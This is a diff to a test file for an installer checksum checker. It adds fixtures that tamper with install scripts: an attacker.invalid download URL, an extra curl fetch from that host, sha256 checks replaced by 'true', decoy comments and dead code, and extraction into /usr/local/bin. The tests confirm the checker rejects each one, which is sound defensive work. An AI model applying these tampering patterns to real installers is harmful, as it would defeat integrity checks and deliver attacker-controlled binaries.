@@ -10,6 +10,14 @@ import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 
 const REPO_ROOT = path.join(import.meta.dirname, "..");
+const INSTALLER_TEMPLATE = fs.readFileSync(
+  path.join(REPO_ROOT, "scripts/install-openshell.sh"),
+  "utf8",
+);
+const BREV_TEMPLATE = fs.readFileSync(
+  path.join(REPO_ROOT, "scripts/brev-launchable-ci-cpu.sh"),
+  "utf8",
+);
 const ASSET_DIGESTS = new Map([
   [
     "openshell-x86_64-unknown-linux-musl.tar.gz",
@@ -55,13 +63,39 @@ const OFFICIAL_UNEXPECTED_BREV_DIGEST =
 const SYMLINK_INPUT_MARKER = "LEAK565";
 type FixtureMode =
   | "allowlisted-alternate-version"
+  | "brev-bypassed-comparison"
+  | "brev-changed-asset"
+  | "brev-changed-extraction-target"
+  | "brev-changed-url"
+  | "brev-comment-decoy"
+  | "brev-dead-code-decoy"
+  | "brev-decoy-table"
+  | "brev-bypassed-verifier-call"
+  | "brev-extra-download"
+  | "brev-indirect-selector-override"
+  | "brev-later-selector-override"
+  | "brev-literalized-pin-selector"
   | "brev-mismatch"
+  | "brev-sha-command-bypass"
   | "complete"
   | "duplicate-brev-pin"
   | "failure"
   | "incomplete-trusted-allowlist"
   | "installer-max-version-drift"
+  | "installer-bypassed-comparison"
+  | "installer-changed-asset"
+  | "installer-changed-checksum"
+  | "installer-changed-extraction-target"
+  | "installer-changed-url"
+  | "installer-comment-decoy"
+  | "installer-dead-code-decoy"
+  | "installer-decoy-table"
+  | "installer-extra-download"
+  | "installer-indirect-selector-override"
+  | "installer-later-selector-override"
+  | "installer-literalized-pin-input"
   | "installer-pin-selector-drift"
+  | "installer-sha-command-bypass"
   | "mismatched-table-versions"
   | "missing-brev-pin"
   | "multiple-installer-versions"
@@ -89,7 +123,47 @@ type PinFormatting =
 const corruptFirstBrevPin = (source: string): string =>
   source.replace(ASSET_DIGESTS.get(ASSETS[0]) ?? "missing", "0".repeat(64));
 const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
+  "brev-bypassed-comparison": (source) =>
+    source.replace('[[ "$release_sha" == "$expected_sha" ]]', "true"),
+  "brev-changed-asset": (source) =>
+    source.replace(
+      'openshell-x86_64-unknown-linux-musl.tar.gz" ;;',
+      'openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz" ;;',
+    ),
+  "brev-changed-extraction-target": (source) =>
+    source.replace(
+      'tar xzf "$tmpdir/$asset" -C "$tmpdir"',
+      'tar xzf "$tmpdir/$asset" -C /usr/local/bin',
+    ),
+  "brev-changed-url": (source) =>
+    source.replace(
+      "https://github.com/NVIDIA/OpenShell/releases/download/${OPENSHELL_VERSION}/${asset}",
+      "https://attacker.invalid/openshell/${OPENSHELL_VERSION}/${asset}",
+    ),
+  "brev-comment-decoy": (source) => {
+    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
+    const comparison = '[[ "$release_sha" == "$expected_sha" ]]';
+    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
+  },
+  "brev-dead-code-decoy": (source) => {
+    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
+    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"')}\nif false; then\n  ${lookup}\nfi\n`;
+  },
+  "brev-decoy-table": (source) =>
+    source.replace(
+      'openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
+      'attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
+    ),
+  "brev-bypassed-verifier-call": (source) =>
+    source.replace('verify_openshell_cli_asset "$tmpdir" "$asset"', ":"),
+  "brev-extra-download": (source) => `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
+  "brev-indirect-selector-override": (source) =>
+    `${source}\nselector=OPENSHELL_VERSION\ndeclare "$selector=v9.9.9"\n`,
+  "brev-later-selector-override": (source) => `${source}\nOPENSHELL_VERSION="v9.9.9"\n`,
+  "brev-literalized-pin-selector": (source) =>
+    source.replace('case "${release_tag}:${asset}" in', "case '${release_tag}:${asset}' in"),
   "brev-mismatch": corruptFirstBrevPin,
+  "brev-sha-command-bypass": (source) => source.replace("sha_cmd=(sha256sum)", "sha_cmd=(true)"),
   "duplicate-brev-pin": (source) => {
     const pinLine = `      printf '%s\\n' "${ASSET_DIGESTS.get(ASSETS[0])}"`;
     return source.replace(pinLine, `${pinLine}\n${pinLine}`);
@@ -99,7 +173,7 @@ const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> =
   "mismatched-table-versions": (source) => source.replaceAll("v0.0.72:", "v0.0.73:"),
   "official-but-unexpected-brev-asset": (source) =>
     source
-      .replace(ASSETS[1] ?? "missing", OFFICIAL_UNEXPECTED_BREV_ASSET)
+      .replace(`v0.0.72:${ASSETS[1]})`, `v0.0.72:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
       .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
   "pr-checker-bypass": corruptFirstBrevPin,
   "pr-parser-bypass": corruptFirstBrevPin,
@@ -115,10 +189,55 @@ const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> =
     ),
 };
 const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
+  "installer-bypassed-comparison": (source) =>
+    source.replace('[ "$release_sha" = "$expected_sha" ]', "true"),
+  "installer-changed-asset": (source) =>
+    source.replace(
+      'ASSETS+=("openshell-gateway-x86_64-unknown-linux-gnu.tar.gz")',
+      'ASSETS+=("openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz")',
+    ),
+  "installer-changed-checksum": (source) =>
+    source.replace(
+      'CHECKSUM_FILES+=("openshell-sandbox-checksums-sha256.txt")',
+      'CHECKSUM_FILES+=("openshell-checksums-sha256.txt")',
+    ),
+  "installer-changed-extraction-target": (source) =>
+    source.replace(
+      'tar xzf "$tmpdir/$asset_name" -C "$tmpdir"',
+      'tar xzf "$tmpdir/$asset_name" -C /usr/local/bin',
+    ),
+  "installer-changed-url": (source) =>
+    source.replace(
+      "https://github.com/NVIDIA/OpenShell/releases/download/${RELEASE_TAG}/$name",
+      "https://attacker.invalid/openshell/${RELEASE_TAG}/$name",
+    ),
+  "installer-comment-decoy": (source) => {
+    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
+    const comparison = '[ "$release_sha" = "$expected_sha" ]';
+    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
+  },
+  "installer-dead-code-decoy": (source) => {
+    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
+    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"')}\nif false; then\n  ${lookup}\nfi\n`;
+  },
+  "installer-decoy-table": (source) =>
+    source.replace(
+      'openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
+      'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
+    ),
+  "installer-extra-download": (source) =>
+    `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
+  "installer-indirect-selector-override": (source) =>
+    `${source}\nselector=RELEASE_TAG\ndeclare "$selector=v9.9.9"\n`,
+  "installer-later-selector-override": (source) => `${source}\nPIN_VERSION="9.9.9"\n`,
+  "installer-literalized-pin-input": (source) =>
+    source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
   "installer-max-version-drift": (source) =>
     source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.82"'),
   "installer-pin-selector-drift": (source) =>
     source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
+  "installer-sha-command-bypass": (source) =>
+    source.replace('SHA_CMD="sha256sum"', 'SHA_CMD="true"'),
   "multiple-installer-versions": (source) =>
     source.replace(`v0.0.72:${ASSETS[0]}`, `v0.0.73:${ASSETS[0]}`),
   "official-but-unexpected-installer-asset": (source) =>
@@ -257,6 +376,44 @@ function renderPinFunction(
   return `${functionOpening}\n${localInputs}\n${caseOpening}\n${cases}\n    *)\n      return 1\n      ;;\n  esac\n}\n`;
 }
 
+function replacePinFunction(
+  source: string,
+  functionName: string,
+  nextFunctionName: string,
+  replacement: string,
+): string {
+  const start = source.indexOf(`${functionName}() {`);
+  const next = source.indexOf(`\n${nextFunctionName}() {`, start);
+  if (start === -1 || next === -1) throw new Error(`unable to replace ${functionName}`);
+  return `${source.slice(0, start)}${replacement}${source.slice(next)}`;
+}
+
+function renderInstallerTemplate(openshellVersion: string, pinFunction: string): string {
+  const selected = INSTALLER_TEMPLATE.replace(
+    /^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
+    `MAX_VERSION="${openshellVersion}"`,
+  );
+  return replacePinFunction(
+    selected,
+    "openshell_pinned_sha256",
+    "openshell_checksum_line",
+    pinFunction,
+  );
+}
+
+function renderBrevTemplate(openshellVersion: string, pinFunction: string): string {
+  const selected = BREV_TEMPLATE.replace(
+    /^(\s*stable\s*\|\s*auto\)\s*OPENSHELL_VERSION=")v[0-9]+\.[0-9]+\.[0-9]+("\s*;;\s*)$/m,
+    `$1v${openshellVersion}$2`,
+  );
+  return replacePinFunction(
+    selected,
+    "openshell_cli_pinned_sha256",
+    "openshell_checksum_line",
+    pinFunction,
+  );
+}
+
 function createFixture(
   openshellVersion = "0.0.72",
   formatting: PinFormatting = "canonical",
@@ -285,21 +442,22 @@ function createFixture(
   );
   fs.writeFileSync(
     path.join(scriptsDir, "install-openshell.sh"),
-    `MAX_VERSION="${openshellVersion}"\nPIN_VERSION="$MAX_VERSION"\n${renderPinFunction(
-      "openshell_pinned_sha256",
-      ASSETS,
+    renderInstallerTemplate(
       openshellVersion,
-      formatting,
-    )}`,
+      renderPinFunction("openshell_pinned_sha256", ASSETS, openshellVersion, formatting),
+    ),
   );
   fs.writeFileSync(
     path.join(scriptsDir, "brev-launchable-ci-cpu.sh"),
-    `case "$NEMOCLAW_REF" in\n  stable | auto) OPENSHELL_VERSION="v${openshellVersion}" ;;\nesac\n${renderPinFunction(
-      "openshell_cli_pinned_sha256",
-      ASSETS.slice(0, 2),
+    renderBrevTemplate(
       openshellVersion,
-      formatting,
-    )}`,
+      renderPinFunction(
+        "openshell_cli_pinned_sha256",
+        ASSETS.slice(0, 2),
+        openshellVersion,
+        formatting,
+      ),
+    ),
   );
   fs.writeFileSync(
     path.join(binDir, "curl"),
@@ -471,6 +629,26 @@ describe("installer hash verification", () => {
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
+  it("requires the trusted allowlist prerequisite before a newer pin PR", () => {
+    // The first invocation deliberately keeps the trusted checker in its old
+    // base state (0.0.72 only) while the separate target tree selects 9.9.9.
+    // The target cannot authorize itself. The second invocation models the
+    // prerequisite allowlist commit already present in trusted base code; only
+    // then may the otherwise identical pin tree pass.
+    const beforePrerequisite = runFixture("complete", "9.9.9", true);
+    expect(beforePrerequisite.status).toBe(1);
+    expect(beforePrerequisite.stdout).toContain(
+      "OpenShell v9.9.9 is not in the trusted release-manifest allowlist",
+    );
+    expect(beforePrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");
+
+    const afterPrerequisite = runFixture("allowlisted-alternate-version", "9.9.9", true);
+    expect(afterPrerequisite.status).toBe(0);
+    expect(afterPrerequisite.stdout).toContain("Checking OpenShell v9.9.9 release assets");
+    expect(afterPrerequisite.stdout).toContain("All installer hashes are current");
+    expect(afterPrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");
+  });
+
   it("fails closed when an allowlisted release lacks all three manifest digests", () => {
     const result = runFixture("incomplete-trusted-allowlist", undefined, true);
 
@@ -503,7 +681,7 @@ describe("installer hash verification", () => {
       "brev-stable-version-drift",
       "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.82",
     ],
-    ["installer-pin-selector-drift", 'installer PIN_VERSION must be exactly "$MAX_VERSION"'],
+    ["installer-pin-selector-drift", "installer operational template is not base-trusted"],
   ] as const)("rejects %s", (mode, diagnostic) => {
     const result = runFixture(mode, undefined, true);
 
@@ -514,6 +692,49 @@ describe("installer hash verification", () => {
   });
 
   it.each([
+    ["installer-decoy-table", "installer operational template is not base-trusted"],
+    ["installer-comment-decoy", "installer operational template is not base-trusted"],
+    ["installer-dead-code-decoy", "installer operational template is not base-trusted"],
+    ["installer-later-selector-override", "installer operational template is not base-trusted"],
+    ["installer-indirect-selector-override", "installer operational template is not base-trusted"],
+    ["installer-sha-command-bypass", "installer operational template is not base-trusted"],
+    ["installer-extra-download", "installer operational template is not base-trusted"],
+    ["installer-changed-asset", "installer operational template is not base-trusted"],
+    ["installer-changed-checksum", "installer operational template is not base-trusted"],
+    ["installer-changed-url", "installer operational template is not base-trusted"],
+    ["installer-bypassed-comparison", "installer operational template is not base-trusted"],
+    ["installer-changed-extraction-target", "installer operational template is not base-trusted"],
+    ["brev-decoy-table", "Brev launchable operational template is not base-trusted"],
+    ["brev-comment-decoy", "Brev launchable operational template is not base-trusted"],
+    ["brev-dead-code-decoy", "Brev launchable operational template is not base-trusted"],
+    ["brev-bypassed-verifier-call", "Brev launchable operational template is not base-trusted"],
+    ["brev-later-selector-override", "Brev launchable operational template is not base-trusted"],
+    ["brev-indirect-selector-override", "Brev launchable operational template is not base-trusted"],
+    ["brev-sha-command-bypass", "Brev launchable operational template is not base-trusted"],
+    ["brev-extra-download", "Brev launchable operational template is not base-trusted"],
+    ["brev-changed-asset", "Brev launchable operational template is not base-trusted"],
+    ["brev-changed-url", "Brev launchable operational template is not base-trusted"],
+    ["brev-bypassed-comparison", "Brev launchable operational template is not base-trusted"],
+    ["brev-changed-extraction-target", "Brev launchable operational template is not base-trusted"],
+  ] as const)("rejects operational-consumption drift in %s", (mode, diagnostic) => {
+    const result = runFixture(mode, undefined, true);
+
+    expect(result.status).toBe(1);
+    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
+    expect(result.stdout).toContain(diagnostic);
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("All installer hashes are current");
+  });
+
+  it.each([
+    [
+      "installer-literalized-pin-input",
+      "openshell_pinned_sha256 must start with local release_tag and asset inputs",
+    ],
+    [
+      "brev-literalized-pin-selector",
+      "openshell_cli_pinned_sha256 must select on release_tag and asset",
+    ],
     [
       "multiple-installer-versions",
       "openshell_pinned_sha256 must contain exactly one release version, found 0.0.72, 0.0.73",
